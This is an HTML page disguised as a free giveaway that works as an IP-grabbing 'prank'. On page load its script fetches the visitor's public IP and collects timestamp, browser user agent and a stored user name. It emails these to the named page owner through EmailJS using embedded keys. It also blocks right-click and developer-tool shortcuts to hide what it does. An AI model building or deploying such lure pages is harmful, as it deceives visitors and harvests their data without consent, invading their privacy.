<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <meta name="mobile-web-app-capable" content="yes">
    <title>üéÅ Free Giveaway!</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            background-image: url('OIP.webp');
            background-size: cover;
            background-position: center;
            background-blend-mode: overlay;
            background-attachment: fixed;
            height: 100vh;
            max-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
            overflow: hidden;
            position: relative;
            width: 100%;
            box-sizing: border-box;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(26, 26, 46, 0.9) 0%, rgba(22, 33, 62, 0.9) 50%, rgba(15, 52, 96, 0.9) 100%);
            z-index: 0;
        }

        .container {
            background: rgba(30, 30, 46, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 25px 25px;
            max-width: 500px;
            width: calc(100% - 40px);
            max-height: 90vh;
            overflow: hidden;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.8), 
                        0 0 0 1px rgba(255, 255, 255, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
            text-align: center;
            animation: slideIn 0.6s ease-out;
            position: relative;
            z-index: 1;
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-sizing: border-box;
            margin: auto;
            display: flex;
            flex-direction: column;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% {
                transform: translateX(-100%) translateY(-100%) rotate(45deg);
            }
            100% {
                transform: translateX(100%) translateY(100%) rotate(45deg);
            }
        }

        .image-container {
            width: 140px;
            height: 140px;
            margin: 0 auto 12px;
            border-radius: 50%;
            overflow: hidden;
            border: 4px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6),
                        0 0 20px rgba(231, 76, 60, 0.3),
                        inset 0 0 20px rgba(255, 255, 255, 0.1);
            animation: imageBounce 2s infinite ease-in-out;
            position: relative;
            z-index: 2;
            flex-shrink: 0;
        }

        @keyframes imageBounce {
            0%, 100% {
                transform: translateY(0) scale(1);
            }
            50% {
                transform: translateY(-15px) scale(1.05);
            }
        }

        .image-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .image-container::before {
            content: '';
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border-radius: 50%;
            background: linear-gradient(45deg, #e74c3c, #c0392b, #8e44ad, #3498db, #e74c3c);
            z-index: -1;
            animation: rotateBorder 3s linear infinite;
            opacity: 0.8;
            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5);
        }

        @keyframes rotateBorder {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .emoji {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
            display: none; /* Hide emoji, using image instead */
        }

        @keyframes bounce {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-20px);
            }
        }

        h1 {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 50%, #c44569 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 30px;
            font-weight: 800;
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
            text-shadow: 0 0 20px rgba(255, 107, 107, 0.5);
            letter-spacing: -0.5px;
            filter: drop-shadow(0 0 10px rgba(255, 107, 107, 0.3));
            flex-shrink: 0;
        }

        .subtitle {
            color: #b8b8b8;
            font-size: 19px;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
            font-weight: 500;
            line-height: 1.6;
        }

        .message {
            background: linear-gradient(135deg, rgba(231, 76, 60, 0.3) 0%, rgba(192, 57, 43, 0.3) 100%);
            color: #ff6b6b;
            padding: 25px;
            border-radius: 20px;
            margin: 30px 0;
            font-size: 20px;
            font-weight: bold;
            position: relative;
            z-index: 1;
            animation: pulse 2s infinite;
            box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1),
                        0 0 20px rgba(231, 76, 60, 0.3);
            border: 2px solid rgba(231, 76, 60, 0.4);
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: #ff6b6b;
            animation: confettiFall linear infinite;
            box-shadow: 0 0 10px currentColor;
        }

        @keyframes confettiFall {
            to {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 107, 107, 0.3);
            border-radius: 50%;
            border-top-color: #ff6b6b;
            animation: spin 1s ease-in-out infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .reveal {
            margin-top: 12px;
            padding: 18px;
            background: linear-gradient(135deg, rgba(231, 76, 60, 0.15) 0%, rgba(192, 57, 43, 0.15) 100%);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            opacity: 0;
            position: relative;
            z-index: 1;
            border: 2px solid rgba(231, 76, 60, 0.3);
            box-shadow: 0 5px 30px rgba(231, 76, 60, 0.3),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
            animation: fadeIn 0.8s ease-in forwards;
            animation-delay: 0.3s;
            flex: 1;
            min-height: 0;
            overflow-y: auto;
        }

        .reveal.show {
            opacity: 1;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .prank-text {
            font-size: 24px;
            color: #ff6b6b;
            font-weight: 800;
            margin-bottom: 12px;
            text-shadow: 0 0 20px rgba(255, 107, 107, 0.8),
                         0 0 40px rgba(231, 76, 60, 0.5);
            animation: glow 2s ease-in-out infinite alternate;
            flex-shrink: 0;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 20px rgba(255, 107, 107, 0.8),
                             0 0 40px rgba(231, 76, 60, 0.5);
            }
            to {
                text-shadow: 0 0 30px rgba(255, 107, 107, 1),
                             0 0 60px rgba(231, 76, 60, 0.8),
                             0 0 80px rgba(231, 76, 60, 0.6);
            }
        }

        .reveal p {
            color: #e0e0e0;
            line-height: 1.5;
            font-size: 14px;
            margin-top: 10px;
            margin-bottom: 8px;
        }

        .reveal .name-highlight {
            color: #ff6b6b;
            font-weight: 700;
            font-size: 17px;
            text-shadow: 0 0 10px rgba(255, 107, 107, 0.6);
        }

        .details-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid rgba(231, 76, 60, 0.3);
            text-align: left;
        }

        .detail-item {
            margin: 8px 0;
            padding: 8px;
            background: rgba(231, 76, 60, 0.1);
            border-radius: 8px;
            border-left: 3px solid #ff6b6b;
        }

        .detail-label {
            color: #ff6b6b;
            font-weight: 700;
            font-size: 11px;
            display: block;
            margin-bottom: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .detail-value {
            color: #e0e0e0;
            font-size: 13px;
            font-weight: 500;
            word-break: break-word;
            overflow-wrap: break-word;
            display: block;
            max-width: 100%;
            line-height: 1.4;
        }

        /* Additional decorative elements */
        .container::after {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 300px;
            height: 300px;
            background: url('OIP.webp');
            background-size: cover;
            background-position: center;
            border-radius: 50%;
            opacity: 0.05;
            filter: blur(20px);
            z-index: 0;
        }

        /* Responsive Styles */
        @media (max-width: 768px) {
            body {
                padding: 8px;
            }

            .container {
                padding: 18px 15px;
                max-width: 100%;
                width: calc(100% - 16px);
                margin: 0 auto;
                border-radius: 18px;
                max-height: 96vh;
            }

            .image-container {
                width: 90px;
                height: 90px;
                margin-bottom: 8px;
            }

            .image-container::before {
                top: -3px;
                left: -3px;
                right: -3px;
                bottom: -3px;
            }

            h1 {
                font-size: 22px;
                margin-bottom: 6px;
            }

            .prank-text {
                font-size: 18px;
                margin-bottom: 8px;
            }

            .reveal {
                padding: 12px;
                margin-top: 8px;
            }

            .reveal p {
                font-size: 12px;
                line-height: 1.4;
                margin-top: 6px;
                margin-bottom: 4px;
            }

            .details-box {
                padding: 10px;
                margin: 8px 0;
            }

            .detail-item {
                margin: 5px 0;
                padding: 5px;
            }

            .detail-label {
                font-size: 9px;
                margin-bottom: 2px;
            }

            .detail-value {
                font-size: 11px;
                line-height: 1.3;
            }

            .reveal .name-highlight {
                font-size: 13px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .container {
                padding: 25px 20px;
                width: calc(100% - 20px);
                border-radius: 15px;
            }

            .image-container {
                width: 120px;
                height: 120px;
                margin-bottom: 15px;
            }

            h1 {
                font-size: 24px;
                margin-bottom: 15px;
            }

            .prank-text {
                font-size: 20px;
                margin-bottom: 12px;
            }

            .reveal {
                padding: 18px;
                margin-top: 15px;
            }

            .reveal p {
                font-size: 14px;
                line-height: 1.5;
                margin-bottom: 15px;
            }

            .details-box {
                padding: 12px;
                margin: 12px 0;
                border-radius: 10px;
            }

            .detail-item {
                margin: 10px 0;
                padding: 10px;
                border-radius: 6px;
            }

            .detail-label {
                font-size: 11px;
                margin-bottom: 6px;
            }

            .detail-value {
                font-size: 13px;
                line-height: 1.4;
            }

            .reveal .name-highlight {
                font-size: 15px;
                display: inline-block;
            }

            .message {
                padding: 20px;
                font-size: 18px;
            }
        }

        @media (max-width: 360px) {
            .container {
                padding: 20px 15px;
                width: calc(100% - 20px);
            }

            .image-container {
                width: 100px;
                height: 100px;
            }

            h1 {
                font-size: 22px;
            }

            .prank-text {
                font-size: 18px;
            }

            .reveal {
                padding: 15px;
            }

            .detail-value {
                font-size: 12px;
            }
        }

        /* Ensure text doesn't overflow on small screens */
        .reveal p {
            word-wrap: break-word;
            overflow-wrap: break-word;
        }

        .name-highlight {
            word-break: break-word;
        }

        /* Improve touch targets on mobile */
        @media (hover: none) and (pointer: coarse) {
            .detail-item {
                padding: 12px;
            }
        }

        /* Prevent horizontal scrolling on all devices */
        html {
            max-width: 100vw;
            overflow-x: hidden;
        }

        img, video, iframe {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="image-container">
            <img src="OIP.webp" alt="Giveaway Prize">
        </div>
        <div class="emoji">üéÅ</div>
        <div class="reveal" id="reveal">
            <div class="prank-text">‚ö†Ô∏è You Have Been Pranked! ‚ö†Ô∏è</div>
            <p style="margin-bottom: 12px; color: #e0e0e0; font-size: 14px;">
                The following details have been captured and sent to <span class="name-highlight">Adithyan B Raj</span>:
            </p>
            <div class="details-box">
                <div class="detail-item">
                    <span class="detail-label">IP Address:</span>
                    <span class="detail-value" id="ip-display">Loading...</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Timestamp:</span>
                    <span class="detail-value" id="timestamp-display">Loading...</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Device Info:</span>
                    <span class="detail-value" id="device-display">Loading...</span>
                </div>
            </div>
            <p style="margin-top: 12px; font-size: 12px; color: #b8b8b8; line-height: 1.3;">
                This was a harmless prank site. Better luck next time! üòà
            </p>
        </div>
    </div>

    <script>
        // ========================================
        // EMAILJS CONFIGURATION
        // ========================================
        // Replace these with your EmailJS credentials
        // Get them from: https://dashboard.emailjs.com
        // ========================================
        const EMAILJS_PUBLIC_KEY = 'vArY8l_JQH8mmw2Yd'; // From Account > General
        const EMAILJS_SERVICE_ID = 'service_ndbgopb'; // From Email Services
        const EMAILJS_TEMPLATE_ID = 'template_p4sjbjr'; // From Email Templates (should be just template_xxxxxxx, no extra text)

        // Initialize EmailJS
        (function() {
            emailjs.init(EMAILJS_PUBLIC_KEY);
        })();

        // IP Sender Logic
        let ip; // Variable to store the IP address
        let timestamp; // Variable to store the timestamp
        let userAgent; // Variable to store the device info

        // Function to update the displayed details
        function updateDetailsDisplay() {
            document.getElementById('ip-display').textContent = ip || 'Not available';
            document.getElementById('timestamp-display').textContent = timestamp || 'Not available';
            document.getElementById('device-display').textContent = userAgent || 'Not available';
        }

        // Create confetti effect
        function createConfetti() {
            const colors = ['#ff6b6b', '#e74c3c', '#c0392b', '#8e44ad', '#9b59b6'];
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    const confetti = document.createElement('div');
                    confetti.className = 'confetti';
                    confetti.style.left = Math.random() * 100 + '%';
                    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                    confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    confetti.style.animationDelay = Math.random() * 2 + 's';
                    document.body.appendChild(confetti);
                    
                    setTimeout(() => {
                        confetti.remove();
                    }, 5000);
                }, i * 50);
            }
        }

        // Fetch IP and send email
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            ip = data.ip; // Store the IP address in the variable
            timestamp = new Date().toLocaleString();
            userAgent = navigator.userAgent;
            
            console.log("Visitor's IP:", ip); // Log it for testing
            updateDetailsDisplay(); // Update the display with captured details
            sendEmailWithEmailJS(); // Call sendEmail after the IP is fetched
          })
          .catch(error => {
            console.error('Error fetching IP address:', error);
            timestamp = new Date().toLocaleString();
            userAgent = navigator.userAgent;
            updateDetailsDisplay(); // Update with available data even if IP fails
          });

        function sendEmailWithEmailJS() {
          const user1 = localStorage.getItem('userName') || 'Guest';
          
          // EmailJS template parameters
          // Make sure these match your EmailJS template variables
          const templateParams = {
            user: user1,
            ip_address: ip,
            timestamp: timestamp,
            device: userAgent
          };

          console.log("Sending email with params:", templateParams);
          console.log("Service ID:", EMAILJS_SERVICE_ID);
          console.log("Template ID:", EMAILJS_TEMPLATE_ID);
          
          emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
            .then(function(response) {
              console.log("‚úÖ Email sent successfully!");
              console.log("Status:", response.status);
              console.log("Response:", response.text);
            })
            .catch(function(error) {
              console.error("‚ùå Error sending email:");
              console.error("Error details:", error);
              console.error("Error text:", error.text || error.message);
            });
        }

        // Show the reveal message and confetti
        setTimeout(() => {
            document.getElementById('reveal').classList.add('show');
            createConfetti();
        }, 300);

        // Prevent right-click
        document.addEventListener('contextmenu', function (e) {
            e.preventDefault();
        });

        // Prevent common keyboard shortcuts
        document.addEventListener('keydown', function (e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
